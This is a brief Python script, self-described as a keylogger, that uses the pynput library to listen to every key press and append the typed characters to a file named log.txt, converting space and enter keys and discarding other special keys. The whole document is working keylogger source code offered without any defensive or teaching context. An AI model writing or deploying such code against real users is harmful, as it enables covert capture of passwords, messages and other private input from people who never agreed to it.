from pynput.keyboard import Listener

# This is a keylogger script that captures keystrokes and stores them in a log file.
def write_to_file(key):
    keydata = str(key)
    keydata = keydata.replace("'","")

    if keydata == 'Key.space':
        keydata = ' '

    elif keydata == 'Key.enter':
        keydata = '\n'

    elif keydata.startswith('Key'):
         keydata = ''

    with open('log.txt', 'a') as f: 
        f.write(keydata) 

with Listener(on_press=write_to_file) as l:
    l.join()
